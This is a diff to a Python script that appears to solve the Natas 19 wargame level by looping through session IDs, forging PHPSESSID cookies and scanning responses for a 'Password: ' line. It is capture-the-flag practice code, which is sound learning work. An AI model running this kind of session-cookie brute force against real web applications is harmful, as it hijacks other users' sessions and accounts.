@@ -1,8 +1,9 @@
-from builtins import str, bytes
+import re
+from base64 import b64encode
+from builtins import str
 from time import sleep
 
 import requests
-from base64 import b64encode
 
 idx = 0
 pw = ''
@@ -26,13 +27,14 @@ while idx < 640:
     idx += 1
     print("looking for %i" % idx)
 
-    #resp = injectCookie('natas19', idx)
-    #if "Password: " in resp.text:
-    #    print(resp.text)
+    resp = injectCookie('natas19', idx)
+    matches = [line for line in resp.text.splitlines() if re.search(r'Password: ', line)]
+    if matches:
+        print(matches)
     # OR
-    resp = createCookie('natas19')
-    val = resp.cookies['PHPSESSID']
-    print(bytes.fromhex(val).decode('utf-8'))
+    #resp = createCookie('admin')
+    #val = resp.cookies['PHPSESSID']
+    #print("hex: %s, dec: %s" % (val, bytes.fromhex(val).decode('utf-8')))
 
     sleep(0.3)
 
